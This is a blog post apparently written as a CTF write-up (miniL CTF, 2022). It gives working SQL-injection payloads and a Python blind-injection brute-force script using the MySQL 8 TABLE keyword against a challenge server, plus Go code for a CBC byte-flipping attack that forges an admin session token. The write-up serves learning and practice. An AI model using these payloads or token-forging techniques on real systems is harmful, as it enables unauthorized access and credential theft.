<!DOCTYPE html><html lang="ch-ZN"><head><meta charset="UTF-8"><meta content="width=device-width,initial-scale=1,minimum-scale=1" name="viewport"><meta content="ie=edge" http-equiv="X-UA-Compatible"><meta content="#fff" name="theme-color" id="theme-color"><meta content="这是pankas的小站~(-V-)~欢迎访问" name="description"><link href="/icon/logo.png" rel="icon"><title>miniL-web</title><meta content="miniL-web" property="og:title"><meta content="https://pankas.top/2022/05/05/miniL-web/index.html" property="og:url"><meta content="/img/miniL-web.jpg" property="og:img"><meta content="这是pankas的小站~(-V-)~欢迎访问" property="og:img"><meta content="article" property="og:type"><meta content="2022-05-05" property="og:article:published_time"><meta content="2022-05-07" property="og:article:modified_time"><meta content="pankas" property="og:article:author"><meta content="SQL" property="og:article:tag"><meta content="CTF" property="og:article:tag"><meta content="mysql8" property="og:article:tag"><meta content="CBC" property="og:article:tag"><script>function loadScript(e,t){var n=document.createElement("script");n.src=e,t&&(n.onload=t),n.async=!0,document.body.appendChild(n)}function loadCSS(e,t,n){var a=document.createElement("link");a.ref="stylesheet",a.href=e,a.dataset[t]=n,document.head.appendChild(a)}function changeCSS(e,t,n){var t=document.querySelector(t),a=document.createElement("link");a.setAttribute("rel","stylesheet"),a.setAttribute("href",e),a.dataset.prism=n,document.head.replaceChild(a,t)}</script><script>var reverseDarkList={dark:"light",light:"dark"},themeColor={dark:"#1c1c1e",light:"#fff"},getCssMediaQuery=function(){return window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light"},reverseDarkModeSetting=function(){var e=localStorage.getItem("user-color-scheme");if(reverseDarkList[e])e=reverseDarkList[e];else{if(null!==e)return;e=reverseDarkList[getCssMediaQuery()]}return localStorage.setItem("user-color-scheme",e),e}</script><script>var setDarkmode=function(e){(e=e||localStorage.getItem("user-color-scheme"))===getCssMediaQuery()?(document.documentElement.removeAttribute("data-user-color-scheme"),localStorage.removeItem("user-color-scheme"),document.getElementById("theme-color").content=themeColor[e],document.getElementById("theme-color").dataset.mode=e):reverseDarkList[e]?(document.documentElement.setAttribute("data-user-color-scheme",e),document.getElementById("theme-color").content=themeColor[e],document.getElementById("theme-color").dataset.mode=e):(document.documentElement.removeAttribute("data-user-color-scheme"),localStorage.removeItem("user-color-scheme"),document.getElementById("theme-color").content=themeColor[getCssMediaQuery()],document.getElementById("theme-color").dataset.mode=getCssMediaQuery())};setDarkmode()</script><link href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" rel="preload" as="style"><link href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" rel="preload" as="style"><link href="/js/lib/lightbox/baguetteBox.min.js" rel="preload" as="script"><link href="/js/lib/lightbox/baguetteBox.min.css" rel="preload" as="style"><link href="/js/lib/lozad.min.js" rel="preload" as="script"><link href="/css/main.css" rel="stylesheet"><link href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" rel="stylesheet"><link href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" rel="stylesheet"><link href="/js/lib/lightbox/baguetteBox.min.css" rel="stylesheet"><meta content="Hexo 6.0.0" name="generator"></head><body><div class="wrapper"><nav class="navbar"><div class="navbar-logo"><span class="navbar-logo-main"><img alt="blog logo" class="navbar-logo-img" src="/icon/logo.png" height="32" width="32"> <span class="navbar-logo-dsc">pankas'blog</span></span></div><div class="navbar-menu"><a href="/" class="navbar-menu-item">首页 </a><a href="/archives" class="navbar-menu-item">归档 </a><a href="/tags" class="navbar-menu-item">标签 </a><a href="/categories" class="navbar-menu-item">分类 </a><a href="/about" class="navbar-menu-item">关于 </a><a href="/links" class="navbar-menu-item">友链 </a><a class="navbar-menu-item darknavbar" id="dark"><i class="iconfont icon-weather"></i> </a><a class="navbar-menu-item searchnavbar" id="search"><i class="iconfont icon-search" style="font-size:1.2rem;font-weight:400"></i></a></div></nav><div id="local-search" style="display:none"><input class="navbar-menu-item" id="search-input" placeholder="请输入搜索内容..."><div id="search-content"></div></div><div class="section-wrap"><div class="container"><div class="columns"><main class="main-column"><div class="image-wrapper"><img alt="miniL-web thumbnail" class="lozad image" src="/img/miniL-web.jpg" data-src="/img/miniL-web.jpg" srcset="data:image/svg+xml,%3Csvg%20xmlns=&#39;http://www.w3.org/2000/svg&#39;%20viewBox=&#39;0%200%20300%20300&#39;%3E%3C/svg%3E"></div><article class="card card-content"><header><h1 class="post-title">miniL-web</h1></header><div class="post-meta post-show-meta"><time datetime="2022-05-05T15:00:01.000Z"><i class="iconfont icon-calendar" style="margin-right:2px"></i> <span>2022-05-05</span> </time><span class="dot"></span> <a href="/categories/CTF-WP/" class="post-meta-link">CTF-WP </a><span class="dot"></span> <span>3.5k 字</span></div><div class="post-meta post-show-meta" style="margin-top:-10px"><div style="display:flex;align-items:center"><i class="iconfont icon-biaoqian" style="margin-right:2px;font-size:1.15rem"></i> <a href="/tags/SQL/" class="post-meta-link">SQL </a><span class="dot"></span> <a href="/tags/CTF/" class="post-meta-link">CTF </a><span class="dot"></span> <a href="/tags/mysql8/" class="post-meta-link">mysql8 </a><span class="dot"></span> <a href="/tags/CBC/" class="post-meta-link">CBC</a></div></div><div class="post-content" id="section"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一个 <del>愉快</del> 的五一假期，总体来说这次minictf就web方向的题目我感觉还是有点难度的，考察范围很广泛，其中两道java相关的也是不知道怎么搞。不过有幸拿到了mini_sql的一血，还是很激动的<del>毕竟第一次在ctf比赛中拿到一血</del>。同时还扩展了一些密码学的东西，比如这个checkin。总之虽然排名并不是很靠前，但学到了很多有用的新姿势，血赚不亏。</p><h3 id="学到的新东西"><a href="#学到的新东西" class="headerlink" title="学到的新东西"></a>学到的新东西</h3><ol><li>MYSQL8新特性在SQL注入中的利用</li><li>CBC字节反转攻击</li></ol><h2 id="mini-sql"><a href="#mini-sql" class="headerlink" title="mini_sql"></a>mini_sql</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>打开题目环境F12可以看到hint（当时没有看这个页面，结果为了 <code>users</code> 这个表名搞了很长时间，结果发现居然有hint。拿到题目一定要仔细啊，不放过任何地方）</p><p><img alt="image-20220506164329614" class="lozad post-image" src="/../post-img/miniL-web.assets/image-20220506164329614.png" data-src="/../post-img/miniL-web.assets/image-20220506164329614.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E"></p><p>存在SQL注入，先fuzz一下看ban掉了哪些关键字符</p><p>过滤了很多东西</p><pre><code class="sql">#
$
%
^
*
+
-
&#39;
?
select
union
information
or
and
substr
char
sleep
if
</code></pre><p>可以看到select都用不了，还有注释单引号什么的，但发现 <code>\</code> 并未被ban，所以根据它的sql语句可以在username处来个 <code>\</code> 转义掉后面的 <code>&#39;</code> 即它后端的sql语句变成了这样</p><pre><code class="sql">select * from users where username=&#39;\&#39; and password=&#39;YOUR_INPUT&#39;;
</code></pre><p>而对于最后的这个 <code>&#39;</code>，由于注释符被过滤了，所以可以使用 <code>;%00</code> 来代替，截断后面的 <code>&#39;</code></p><p>所以后端的sql查询语句可以是</p><pre><code class="sql">select * from users where username=&#39;\&#39; and password=&#39;||1;%00&#39;
</code></pre><p>构造payload发送，可以发现response了 success</p><p><img alt="image-20220506172451224" class="lozad post-image" src="/../post-img/miniL-web.assets/image-20220506172451224.png" data-src="/../post-img/miniL-web.assets/image-20220506172451224.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E"></p><p>但即便是成功登录了也没法拿到falg，测试发现其语法不出错的情况下只有 <code>success!</code>和 <code>fail！</code>两种返回值。</p><p>基本上可以确定是要盲注了</p><p>但问题就难在这里<code>or、 select、 union</code>等关键字都被ban了，很难找到突破口，但我一个习惯确帮助我解决了这道题。对于sql注入我会习惯性的去使用 <code>database()</code> 和 <code>version()</code> 去查看它当前的数据库名和版本信息。试了下发现当前数据库名为 <code>ctf</code> ,但好像没啥用。但这个 version 就不一样了。</p><p>试了下payload</p><pre><code>username=\&amp;password=||version()=5;%00
</code></pre><p>发现竟然返回了 <code>fail!</code>，那就说明这是 mysql8 的版本。验证一下</p><p><img alt="image-20220506173726449" class="lozad post-image" src="/../post-img/miniL-web.assets/image-20220506173726449.png" data-src="/../post-img/miniL-web.assets/image-20220506173726449.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E"></p><p>既然是 mysql8 那因该是有一些其它奇奇怪怪的注入姿势，结果果真有，比如说mysql8新增的 <code>TABLE</code> 关键字。</p><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="TABLE关键字-MYSQL8"><a href="#TABLE关键字-MYSQL8" class="headerlink" title="TABLE关键字(MYSQL8)"></a>TABLE关键字(MYSQL8)</h4><p>翻阅mysql8的 <em><strong><a href="https://dev.mysql.com/doc/refman/8.0/en/table.html" rel="noopener" target="_blank">官方文档</a></strong></em> 可以找到 TABLE 关键字的用法</p><pre><code class="sql">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]
</code></pre><p>它的作用和 <code>SELECT * FROM table_name</code> 的作用差不多，都是列出表的整个内容</p><p>（下文实例的所有users表内容均相同）</p><pre><code class="sql">mysql&gt; TABLE users;
+------+-----------+----------+
| id   | username  | password |
+------+-----------+----------+
|    1 | admin     | qwe123   |
|    2 | guest     | asd321   |
|    3 | adds3awed | 12@qd24  |
+------+-----------+----------+
3 rows in set (0.00 sec)
</code></pre><p>配合 <code>LIMIT</code> 关键字可以精确到某一行</p><pre><code class="sql">mysql&gt; TABLE users LIMIT 0,1;
+------+----------+----------+
| id   | username | password |
+------+----------+----------+
|    1 | admin    | qwe123   |
+------+----------+----------+
1 row in set (0.00 sec)

mysql&gt; TABLE users LIMIT 1,1;
+------+----------+----------+
| id   | username | password |
+------+----------+----------+
|    2 | guest    | asd321   |
+------+----------+----------+
1 row in set (0.01 sec)

mysql&gt; TABLE users LIMIT 1;
+------+----------+----------+
| id   | username | password |
+------+----------+----------+
|    1 | admin    | qwe123   |
+------+----------+----------+
1 row in set (0.00 sec)
</code></pre><p>还可以配合 <code>ORDER BY</code> 详情可以翻阅文档，这里不再赘述。</p><h4 id="mysql的字符串比较"><a href="#mysql的字符串比较" class="headerlink" title="mysql的字符串比较"></a>mysql的字符串比较</h4><p>mysql中的字符串可以配合 <code>()</code> 和表的某一行进行比较，如：</p><pre><code class="sql">mysql&gt; SELECT (1,&#39;admin&#39;,&#39;qwe123&#39;)=(SELECT * FROM users LIMIT 1);
+----------------------------------------------------+
| (1,&#39;admin&#39;,&#39;qwe123&#39;)=(SELECT * FROM users LIMIT 1) |
+----------------------------------------------------+
|                                                  1 |
+----------------------------------------------------+
1 row in set (0.00 sec)

# MYSQL8中使用 TABLE 关键字
mysql&gt; SELECT (1,&#39;admin&#39;,&#39;qwe123&#39;)=(TABLE users LIMIT 1);
+--------------------------------------------+
| (1,&#39;admin&#39;,&#39;qwe123&#39;)=(TABLE users LIMIT 1) |
+--------------------------------------------+
|                                          1 |
+--------------------------------------------+
1 row in set (0.00 sec)
</code></pre><p>对于字符串之间的大小比较其规则是这样的:</p><p><strong>不区分大小写，按照0-9a-z的ascii码大小顺序进行比较，先从两个串的第一个字符进行比较ascii值，第一个字符相同的，比较第二个字符，不同则按照 <code>&gt;</code> 还是 <code>&lt;</code> 直接返回 1或0，如果相同再比较下一个以此类推。如果前面字符全部相同，则以长度更长的为大。</strong>如：</p><pre><code class="sql">mysql&gt; SELECT &#39;a&#39;&lt;&#39;C&#39;;
+---------+
| &#39;a&#39;&lt;&#39;C&#39; |
+---------+
|       1 |
+---------+
1 row in set (0.00 sec)

mysql&gt; SELECT &#39;e&#39;&gt;&#39;ef&#39;;
+----------+
| &#39;e&#39;&gt;&#39;ef&#39; |
+----------+
|        0 |
+----------+
1 row in set (0.00 sec)

mysql&gt; SELECT &#39;adc&#39;&lt;&#39;aea&#39;;
+-------------+
| &#39;adc&#39;&lt;&#39;aea&#39; |
+-------------+
|           1 |
+-------------+
1 row in set (0.00 sec)

mysql&gt; SELECT &#39;qwe&#39;&gt;&#39;qwf&#39;;
+-------------+
| &#39;qwe&#39;&gt;&#39;qwf&#39; |
+-------------+
|           0 |
+-------------+
1 row in set (0.00 sec)
</code></pre><p><strong>利用括号内多个数据与表查询结果比较时，其规则是从括号内第一个参数与表的第一列数据进行比较，如果为 1 则继续比较第二个，如果为 0 则不比较后面的直接返回 0 。</strong></p><pre><code class="sql">mysql&gt; SELECT (&#39;a&#39;,&#39;b&#39;,&#39;cd&#39;)&lt;(&#39;a&#39;,&#39;b&#39;,&#39;ce&#39;);
+-------------------------------+
| (&#39;a&#39;,&#39;b&#39;,&#39;cd&#39;)&lt;(&#39;a&#39;,&#39;b&#39;,&#39;ce&#39;) |
+-------------------------------+
|                             1 |
+-------------------------------+
1 row in set (0.01 sec)

mysql&gt; SELECT (&#39;a&#39;,&#39;b&#39;,&#39;cd&#39;)&lt;(&#39;a&#39;,&#39;b&#39;,&#39;cd&#39;);
+-------------------------------+
| (&#39;a&#39;,&#39;b&#39;,&#39;cd&#39;)&lt;(&#39;a&#39;,&#39;b&#39;,&#39;cd&#39;) |
+-------------------------------+
|                             0 |
+-------------------------------+
1 row in set (0.00 sec)


mysql&gt; SELECT (&#39;a&#39;,&#39;b&#39;,&#39;cd&#39;)&lt;(&#39;a&#39;,&#39;c&#39;,&#39;ab&#39;);
+-------------------------------+
| (&#39;a&#39;,&#39;b&#39;,&#39;cd&#39;)&lt;(&#39;a&#39;,&#39;c&#39;,&#39;ab&#39;) |
+-------------------------------+
|                             1 |
+-------------------------------+
1 row in set (0.00 sec)
</code></pre><p>和表查询结果比较</p><pre><code class="sql">mysql&gt; TABLE users;
+------+-----------+----------+
| id   | username  | password |
+------+-----------+----------+
|    1 | admin     | qwe123   |
|    2 | guest     | asd321   |
|    3 | adds3awed | 12@qd24  |
+------+-----------+----------+
3 rows in set (0.00 sec)

mysql&gt; SELECT (1,&#39;admin&#39;,&#39;&#39;)&lt;(TABLE users LIMIT 1);
+--------------------------------------+
| (1,&#39;admin&#39;,&#39;&#39;)&lt;(TABLE users LIMIT 1) |
+--------------------------------------+
|                                    1 |
+--------------------------------------+
1 row in set (0.00 sec)

mysql&gt; SELECT (1,&#39;admin&#39;,&#39;qw&#39;)&lt;(TABLE users LIMIT 1);
+----------------------------------------+
| (1,&#39;admin&#39;,&#39;qw&#39;)&lt;(TABLE users LIMIT 1) |
+----------------------------------------+
|                                      1 |
+----------------------------------------+
1 row in set (0.00 sec)

mysql&gt; SELECT (1,&#39;admin&#39;,&#39;qx&#39;)&lt;(TABLE users LIMIT 1);
+----------------------------------------+
| (1,&#39;admin&#39;,&#39;qx&#39;)&lt;(TABLE users LIMIT 1) |
+----------------------------------------+
|                                      0 |
+----------------------------------------+
1 row in set (0.00 sec)
</code></pre><p>所以可以利用这些来盲注爆破</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>了解了上文的相关信息后这题就好解了，既然是 users 表，那一般是三个字段 id, username, password。id 第一个应该是 1 （不放心可以验证一下），后面的 username 和 password 写脚本爆破一下就好了。</p><p>可以构造 payload :</p><pre><code>username=1\&amp;password=||(1,0x21,0x21)&lt;(table users limit 1);%00
</code></pre><p>爆破脚本：</p><pre><code class="python">import requests

dic = &#39;_0123456789abcdefghijklmnopqrstuvwxyz&#39;  # 字典
url = &quot;http://47.93.215.154:10000/login.php&quot;

def str2hex(str):
    result = &#39;0x&#39;
    for i in str:
        result += hex(ord(i))[2:]
    return result

def boomSql():
    result = &#39;&#39;
    for i in range(1, 40):
        for j in range(len(dic)):
            #print(dic[j])
            
            # 手动测试第一个字段 id
            # 结果:1

            # 爆第二个字段 username
            # 结果: w3lc0me_t0_m1n1lct5
            # 16进制为 0x77336c63306d655f74305f6d316e316c637435
            payload1 = &#123;&quot;username&quot;: &quot;1\\&quot;,
                        &quot;password&quot;: f&quot;||(1,&#123;str2hex(result+dic[j])&#125;,0x21)&lt;(table users limit 1);\x00&quot;
                        &#125;

            # 爆第三个字段 password
            # 结果:cd51c1005cab68be2f7e6112a4de3e88
            # 因为最后一个字符完成后长度相等又判断为假 所以最后一个字符应为其下一个字母
            # 但是这仅限最后一个字段
            # 所以正确结果是cd51c1005cab68be2f7e6112a4de3e89
            payload2 = &#123;&quot;username&quot;: &quot;1\\&quot;,
                        &quot;password&quot;: f&quot;||(1,0x77336c63306d655f74305f6d316e316c637435,&#123;str2hex(result+dic[j])&#125;)&lt;(table users limit 1);\x00&quot;
                        &#125;

            res = requests.post(url=url, data=payload1)
            # print(res.text)
            if &quot;success&quot; in res.text:
                continue
            elif &quot;fail&quot; in res.text:
                # 返回假时表示上一个字母即为正确结果
                result += dic[j - 1]
                break
        print(result)
if __name__ == &#39;__main__&#39;:
    boomSql()
</code></pre><p>运行得到 username 和 password</p><p>登录拿到flag</p><p><img alt="image-20220506203322665" class="lozad post-image" src="/../post-img/miniL-web.assets/image-20220506203322665.png" data-src="/../post-img/miniL-web.assets/image-20220506203322665.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E"></p><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>打开题目告诉</p><pre><code>Only admin can get the secret!
</code></pre><p>然后仔细研究了一下这个token，发现最前面固定为 <code>0001145141919810</code> ，然后…………..不会了</p><p>后来给了源码，用go语言写的。当时go也没学过，简单学了一下，了解了下关键函数的作用。</p><p><strong>关键代码</strong></p><pre><code class="go">//User的结构
type User struct &#123;
    Name     string
    CreateAt int64
    IP       string
&#125;

//初始化一个token
func IndexController(c *gin.Context) &#123;
    _, err := c.Cookie(&quot;token&quot;)
    if err == nil &#123;
        c.Redirect(http.StatusFound, &quot;/home&quot;)
    &#125;
    //token的结构，后面TokenDecrypt后的结构也是如此
    user := models.User&#123;Name: &quot;guest&quot;, CreateAt: time.Now().Unix(), IP: c.ClientIP()&#125;
    jsonUser, _ := json.Marshal(user)
    token, _ := utils.TokenEncrypt(jsonUser)
    c.SetCookie(&quot;token&quot;, token, 3600, &quot;/&quot;, &quot;&quot;, false, true)
    c.Redirect(http.StatusFound, &quot;/home&quot;)
&#125;
</code></pre><p>flagController.go文件：</p><pre><code class="go">func HomeController(c *gin.Context) &#123;
    token, err := c.Cookie(&quot;token&quot;)
    if err != nil &#123;
        c.Redirect(http.StatusFound, &quot;/&quot;)
    &#125;
    jsonUser, _ := utils.TokenDecrypt(token)
    user := models.User&#123;&#125;
    _ = json.Unmarshal([]byte(jsonUser), &amp;user)
    //只要TokenDecrypt后的结构中的Name为admin就可拿到flag
    if user.Name == &quot;admin&quot; &#123;
        file, _ := os.Open(&quot;/flag&quot;)
        defer file.Close()
        content, _ := ioutil.ReadAll(file)
        _, _ = c.Writer.WriteString(string(content))
    &#125; else &#123;
        _, _ = c.Writer.WriteString(&quot;Only admin can get the secret!&quot;)
    &#125;
&#125;
</code></pre><p>token.go文件:</p><pre><code class="go">var key = []byte(config.KEY)    //配置文件中的密钥（未知）但大小为16字节
var iv = []byte(config.IV)        //CBC加密的初始向量 0001145141919810 （16字节）

type tokenError struct &#123;
    error string
&#125;

func (e *tokenError) Error() string &#123;
    return e.error
&#125;

//对User进行CBC分组加密的函数
func TokenEncrypt(user []byte) (string, error) &#123;
    block, err := aes.NewCipher(key)
    if err != nil &#123;
        return &quot;&quot;, err
    &#125;
    blockSize := block.BlockSize()        //密钥大小
    originData := pad(user, blockSize)    //根据密钥大小分组
    blockMode := cipher.NewCBCEncrypter(block, iv)    //创建加密对象，包含密钥key和初始向量IV
    encrypted := make([]byte, len(originData))        
    blockMode.CryptBlocks(encrypted, originData)    //CBC算法，详情见后文
    return base64.StdEncoding.EncodeToString(append([]byte(config.IV), encrypted...)), nil                                //base64编码
&#125;
//按16字节一组进行分组
func pad(ciphertext []byte, blockSize int) []byte &#123;
    padding := blockSize - len(ciphertext)%blockSize
    padText := bytes.Repeat([]byte&#123;byte(padding)&#125;, padding)
    return append(ciphertext, padText...)
&#125;

//CBC解密
func TokenDecrypt(user string) (string, error) &#123;
    decodeData, err := base64.StdEncoding.DecodeString(user)
    iv = decodeData[:16]        //前16个字节为初始向量iv
    decodeData = decodeData[16:]    //后面为密文
    if err != nil &#123;
        return &quot;&quot;, &amp;tokenError&#123;&quot;Invalid token&quot;&#125;
    &#125;
    block, _ := aes.NewCipher(key)
    blockMode := cipher.NewCBCDecrypter(block, iv)
    originData := make([]byte, len(decodeData))
    blockMode.CryptBlocks(originData, decodeData)
    decrypted, err := unPad(originData)        //整合
    if err != nil &#123;
        return &quot;&quot;, &amp;tokenError&#123;&quot;padding error&quot;&#125;
    &#125;
    return string(decrypted), nil
&#125;
//将多个原文组整合到一起
func unPad(ciphertext []byte) ([]byte, error) &#123;
    length := len(ciphertext)
    unPadding := int(ciphertext[length-1])
    if unPadding &lt; 1 || unPadding &gt; 16 &#123;
        return []byte(&quot;&quot;), &amp;tokenError&#123;&quot;padding error&quot;&#125;
    &#125;
    for i := 0; i &lt; unPadding; i++ &#123;
        if int(ciphertext[length-i-1]) != unPadding &#123;
            return []byte(&quot;&quot;), &amp;tokenError&#123;&quot;padding error&quot;&#125;
        &#125;
    &#125;
    return ciphertext[:(length - unPadding)], nil
&#125;
</code></pre><p>然后…..又不知道怎么办了，感觉是密码学的问题。后来问了问 Carrot2 学长，提示了下是 <strong>CBC字节反转攻击</strong> 后面网上学习了一下，总算是解决了。</p><h3 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h3><p>CBC全称Cipher Block Chaining，密码分组链接模式</p><p>大致的过程是：</p><ol><li>将原文分为若干组，每组的大小一般为初始向量IV的大小，后面不足则填充到相应的大小</li><li>先将第一组与初始向量IV异或得到中间值，之后再用加密算法对中间值进行加密得到第一块Ciphertext，然后再用这块Ciphertext和第二块原文异或得到中间值，再对这个中间值加密得到第二块Ciphertext，后续操作亦是如此。</li><li>将每一块Ciphertext整合得到最终密文(一般还可以在最终的密文前带上初始向量IV，checkin这题就是这样)</li></ol><p>解密反过来操作就行了，这里不再赘述</p><p>详情请见 <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation" rel="noopener" target="_blank">https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation</a></p><p><strong>加密过程</strong></p><p><img alt="automne" class="lozad post-image" src="/../post-img/miniL-web.assets/1.png" data-src="/../post-img/miniL-web.assets/1.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E"></p><p><strong>解密过程</strong></p><p><img alt="automne" class="lozad post-image" src="/../post-img/miniL-web.assets/2.png" data-src="/../post-img/miniL-web.assets/2.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E"></p><p>从加密过程中可以看到，每个密文块都依赖于它前面所有的明文块，所以某一个密文块的变化会影响后一个区块解密后的原文</p><p>CBC Bit-Flipping Attack在国内又被称为CBC字节翻转攻击，无论是翻转bit还是byte，本质上还是一致的，所以不必纠结中英文的不同。首先要知道该攻击发生在CBC的解密环节上。</p><p><img alt="automne" class="lozad post-image" src="/../post-img/miniL-web.assets/4.png" data-src="/../post-img/miniL-web.assets/4.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E"></p><p>上图可以直观地看到，在解密过程里，通过翻转前一组密文里特定位置的bit，从而达到了翻转下一组明文里特定位置bit的效果。同样的，如果可以修改iv，那么也可以修改第一组解密出的明文内容（checkin这道题的解法就是这样）。</p><p>进一步分析其原理 （参考 <a href="https://masterpessimistaa.wordpress.com/2017/05/03/cbc-bit-flipping-attack/" rel="noopener" target="_blank">https://masterpessimistaa.wordpress.com/2017/05/03/cbc-bit-flipping-attack/</a> ）:</p><p><a href="https://ce-automne.github.io/2019/05/23/CBC-Bit-Flipping-Attack-Conclusion/5.png" rel="noopener" target="_blank"><img alt="automne" class="lozad post-image" src="/../post-img/miniL-web.assets/5.png" data-src="/../post-img/miniL-web.assets/5.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E"></a></p><p>从上图可以清楚得到：</p><pre><code>A = P ^ BlockCipherDecryption(B)
</code></pre><p>需要注意的是 BlockCipherDecryption(B)是一个常量，因为这里没有修改B</p><p>对于分组的第n字节，相应地有：</p><pre><code>A[n] = P[n] ^ BlockCipherDecryption(B[n])                     //式（1）
</code></pre><p>变形得到：</p><pre><code>BlockCipherDecryption(B[n]) = A[n] ^ P[n]                    //式（2）
</code></pre><p>在式(1)里，假定我们想要输出的明文P[n]为我们想要的明文，设为P1</p><p>在式(2)里，假定输出的明文P[n]是密文未经过修改得到的真实明文，设为P2</p><p>于是由式(1)式(2)得：</p><pre><code>A[n] = P1 ^ A[n] ^ P2
</code></pre><p>调整顺序：</p><pre><code>A[n] = A[n] ^ P1 ^ P2        
</code></pre><p>可见，通过这种方式就可以修改密文达到翻转解密出的明文字节的效果。</p><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>由题目源码可知是16个字节为一组，需要修改的 Name 正好在第一组，所以只需要修改初始向量 iv 使得 <code>guest</code> 变为 <code>admin</code> 即可</p><p>由上文分析不难推出最终计算所需 iv 的公式为</p><pre><code>IV = IV ^ admin ^ guest            //这里计算的是对应的一个字节
</code></pre><p>exp:</p><pre><code class="go">package main

import (
    &quot;encoding/json&quot;
    &quot;fmt&quot;
    &quot;time&quot;
)

var iv = []byte(&quot;0001145141919810&quot;)

type User struct &#123;
    Name     string
    CreateAt int64
    IP       string
&#125;

func main() &#123;

    var iv = []byte(&quot;0001145141919810&quot;)
    user := User&#123;Name: &quot;guest&quot;, CreateAt: time.Now().Unix(), IP: &quot;127.0.0.1&quot;&#125;
    jsonUser, _ := json.Marshal(user)
    admin := User&#123;Name: &quot;admin&quot;, CreateAt: time.Now().Unix(), IP: &quot;127.0.0.1&quot;&#125;
    jsonAdmin, _ := json.Marshal(admin)
    //每一组为16个字节，修改第一组即可
    for i := 0; i &lt; 16; i++ &#123;
        fmt.Print(string(iv[i] ^ jsonAdmin[i] ^ jsonUser[i]))
    &#125;
&#125;
</code></pre><p>运行得到所需iv为</p><pre><code>0001145147(9#&quot;10
</code></pre><p>将原来token前面的iv( <code>0001145141919810</code> )替换为 <code>0001145147(9#&quot;10</code> ，编码后发送，认证成功，拿到flag</p><h2 id="include"><a href="#include" class="headerlink" title="include"></a>include</h2><p>很简单的签到题，这里不再赘述。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.codetd.com/article/13126014" rel="noopener" target="_blank">https://www.codetd.com/article/13126014</a></p><p><a href="https://www.jianshu.com/p/f4684322e851" rel="noopener" target="_blank">https://www.jianshu.com/p/f4684322e851</a></p><p><a href="https://dev.mysql.com/doc/refman/8.0/en/table.html" rel="noopener" target="_blank">https://dev.mysql.com/doc/refman/8.0/en/table.html</a></p><p><a href="https://ce-automne.github.io/2019/05/23/CBC-Bit-Flipping-Attack-Conclusion/" rel="noopener" target="_blank">https://ce-automne.github.io/2019/05/23/CBC-Bit-Flipping-Attack-Conclusion/</a></p><p><a href="https://resources.infosecinstitute.com/topic/cbc-byte-flipping-attack-101-approach/" rel="noopener" target="_blank">https://resources.infosecinstitute.com/topic/cbc-byte-flipping-attack-101-approach/</a></p></div><div></div></article><div class="nav"><div class="nav-item-next"><a href="/2022/04/30/2022DASCTF-Apr-X-FATE-soeasy-php/" class="nav-link"><div><div class="nav-label">下一篇</div><div class="nav-title">2022DASCTF Apr X FATE-soeasy_php</div></div><i class="iconfont icon-right nav-next-icon"></i></a></div></div><div class="card card-content toc-card" id="mobiletoc"><div class="toc-header"><i class="iconfont icon-menu" style="padding-right:2px"></i>目录</div><ol class="toc"><li class="toc-item toc-level-2"><a href="#%E5%89%8D%E8%A8%80" class="toc-link"><span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a href="#%E5%AD%A6%E5%88%B0%E7%9A%84%E6%96%B0%E4%B8%9C%E8%A5%BF" class="toc-link"><span class="toc-text">学到的新东西</span></a></li></ol></li><li class="toc-item toc-level-2"><a href="#mini-sql" class="toc-link"><span class="toc-text">mini_sql</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90" class="toc-link"><span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86" class="toc-link"><span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a href="#TABLE%E5%85%B3%E9%94%AE%E5%AD%97-MYSQL8" class="toc-link"><span class="toc-text">TABLE关键字(MYSQL8)</span></a></li><li class="toc-item toc-level-4"><a href="#mysql%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%AF%94%E8%BE%83" class="toc-link"><span class="toc-text">mysql的字符串比较</span></a></li></ol></li><li class="toc-item toc-level-3"><a href="#%E9%A2%98%E8%A7%A3" class="toc-link"><span class="toc-text">题解</span></a></li></ol></li><li class="toc-item toc-level-2"><a 